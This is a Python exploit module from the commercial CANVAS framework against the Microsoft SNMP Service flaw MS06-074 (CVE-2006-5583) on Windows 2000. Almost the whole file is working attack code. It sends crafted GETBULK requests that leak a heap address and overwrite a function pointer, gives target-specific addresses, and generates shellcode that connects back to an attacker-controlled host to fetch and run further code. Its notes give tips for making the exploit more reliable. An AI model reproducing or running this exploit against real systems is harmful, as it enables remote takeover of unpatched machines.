#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from libs.pysnmp import v2c,asn1
import time

NAME='Microsoft SNMP Service Remote Arbitrary GlobalFree'
DESCRIPTION='Microsoft SNMP Service Remote Arbitrary GlobalFree'
VERSION='1.0'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='12/12/06'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS06-074.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['Notes']='SNMP service can be configured to restart automatically allowing more attempts'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2006-5583'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5583'
DOCUMENTATION['CVSS'] = 10.0


PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS06-074'

NOTES="""
*****
IMPORTANT: launching a 'snmpwalk' before the actual exploit might
help put the heap in a better state for reliable exploitation!
If you try to exploit the flaw just after a fresh start, the Global
Heap will not have been populated enough to get things working.
*****

About the possible functions to overwrite:
-the PEB RtlEnterCriticalSection function pointer is generic,
 but due to timing issues, might prove unreliable from time to
 time.
-other pointers are very reliable but highly dependant on the
 snmpapi.dll version and localization. The function pointer used
 is g_pfnNtQuerySystemInformation used in SnmpSvcGetUptime().

Tested on:
Windows 2000 Workstation SP4 English OOTB
Windows 2000 Workstation SP4 French UP2DATE
Windows 2000 Server SP3 English OOTB
Windows 2000 Server SP4 English OOTB
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect (N/A)',0], #should be doable
    1: ['Windows 2000 SP0-SP4',0x7ffdf020],
    2: ['Windows 2000 SP4 English',0x754c5100],
    3: ['Windows 2000 SP4 French',0x75455100]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port=161
        self.host=''
        self.badstring=''
        self.version=1
        self.name=NAME
        self.community='public'
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        from shellcode import shellcodeGenerator
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',None)
        if self.version==1:
            sc.addAttr('Fix RtlEnterCriticalSection',{'SimpleFix':1})
        else:
            sc.addAttr('UseWS2Ordinal',None)
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('SmallRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        print sc.getcode()
        self.shellcode=sc.get()
        return self.shellcode

    def run(self):
        info,eip=targets[self.version]
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.community=self.argsDict.get('community',self.community)
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        self.log("Attacking %s:%d"%(self.host,self.port))

        #heapchunks oid is:
        #[busychunk].8bytedata.[freechunk].[what][where].shellcode
        heapchunks='.%d.%d.%d.%d'%(0x20002,0x2100,0,0)
        heapchunks+='.%d.%d.%%d.%%d'%(0x20002,0) #last two to be completed
        heapchunks+='.%d.%d'%(0x06eb,0) #jmp over heap overwritten data
        if (len(self.shellcode)>114*4):
            raise Exception,'Shellcode is too big!'
        shellcode=self.shellcode
        #shellcode='\xcc'+shellcode #debug
        shellcode+='A'*(114*4-len(shellcode))
        #format shellcode as an oid
        import struct
        for i in range(0,len(shellcode),4):
            heapchunks+='.%d'%(struct.unpack('<L',shellcode[i:i+4])[0])
        #heapchunks+=('.%d'%(0xcccccccc))*114 #debug
        badoid='.0'*heapchunks.count('.')
        n=3
        oids=[]
        for i in range(n):
            oids.append(asn1.OBJECTID('.0.0'+badoid).encode())
        oids.append(asn1.OBJECTID('.2.1'+badoid).encode())
        req=v2c.GETBULKREQUEST()
        req['community']=self.community
        req['non_repeaters']=len(oids)
        req['max_repetitions']=3 #min to get a leak
        req['encoded_oids']=oids
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.sendto(req.encode(),(self.host,self.port))
        try:
            answer,host=s.recvfrom(1024)
        except timeoutsocket.Timeout:
            self.log("No response from remote server (no SNMPD I assume)")
            return 0
        except socket.error:
            self.log("ICMP from remote machine - no SNMPD")
            return 0
            
        #print prettyprint(answer) #debug
        rsp=v2c.GETRESPONSE()
        rsp.decode(answer)
        if req!=rsp:
            raise Exception,'Unmatched response: %s vs %s'%(str(req),str(rsp))
        oids=map(lambda x: x[0],map(asn1.OBJECTID().decode,rsp['encoded_oids']))
        if rsp['error_status']:
            raise Exception,'SNMP error #'+str(rsp['error_status'])+' for OID #'+str(rsp['error_index'])
        address=0
        needle='.%d.'%(heapchunks.count('.')+2)
        for oid in oids:
            #print oid #debug
            index=oid.find(needle)
            if index==-1:
                continue
            oid=oid[index+len(needle):]
            index=oid.find('.')
            if index>-1:
                oid=oid[:index]
            address=int(oid)
            self.log('HEAP LEAKED ADDRESS: 0x%x'%(address))
            
        if address==0:
            self.setInfo('%s: No leaked heap address, cannot continue!'%self.name)
            return 0

        heapchunks=heapchunks%(address+0x28,eip) #fill in addresses
        n=20
        oids=[]
        for i in range(n):
            oids.append(asn1.OBJECTID('.0.0.0.0.0.%d.0.0'%(address+0x10)).encode())
        oids.append(asn1.OBJECTID('.2.1'+heapchunks).encode())
        req=v2c.GETBULKREQUEST()
        req['community']=self.community
        req['non_repeaters']=len(oids)
        req['max_repetitions']=3 #min to get an arbitrary free
        req['encoded_oids']=oids
        s.sendto(req.encode(),(self.host,self.port))


        if self.version==1:
            #time.sleep(1)
            oids=[asn1.OBJECTID('.1.3.6.1.2.1.4.23.0').encode()] #this will trigger a call to the PebLock function
            req=v2c.GETREQUEST()
            req['community']=self.community
            req['encoded_oids']=oids
            s.sendto(req.encode(),(self.host,self.port))
        else:
            #now we'll make sure our overwritten pointer is called
            oids=[asn1.OBJECTID('.0.0').encode()]
            req=v2c.GETREQUEST()
            req['community']='HEROES' #this will trigger an auth trap
            req['encoded_oids']=oids
            s.sendto(req.encode(),(self.host,self.port))
        time.sleep(2)

        ret=self.ISucceeded()
        self.setInfo("%s attacking %s:%d - done (success=%d!)"%(NAME,self.host,self.port,ret))
        return ret

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0,None]:
        ret.interact()
